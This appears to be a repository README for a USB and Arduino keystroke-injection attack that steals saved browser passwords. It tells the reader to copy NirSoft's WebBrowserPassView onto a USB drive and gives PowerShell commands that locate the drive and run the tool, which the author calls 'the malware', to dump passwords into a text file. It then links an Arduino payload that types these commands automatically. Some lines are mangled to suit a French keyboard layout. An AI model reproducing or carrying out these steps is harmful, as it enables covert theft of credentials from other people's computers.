

First you have to download the password grabber software the following web site or copy it from the repository :

link to Nirsoft web site : 
http://www.nirsoft.net/password_recovery_tools.html

Next you have to put the password recovery file into a usb //


Plug the USB drive and copy the executable inside it //

open powershell and type //
$usbPath  = Get-WMIOBject Win32_Volume | ? { $_.Label -eq 'DRIVE_NAME' } | select name 

and then type :

 cd $usbPath.name 

and then run the malware :


./WebBrowserPassView /stext pass.txt 


this powershell command will save the passwords in a text file //




//equivlent to <>ZebBrozserPqssViez >stext pqss<txt ###if you have a french layout ..need to work on that !! 




// now you have to automate the execution using arduino the .ino  file is available in the repository  






###################################

code for arduino English layout payload

http://pastebin.com/ZTLsPPjC

###################################

arduino KEY_MODIFIERS

https://www.arduino.cc/en/Reference/KeyboardModifiers


Keyboard.print("]usbPqth = Get6Z;IOBject Zin#@Volu;e ");

###################################












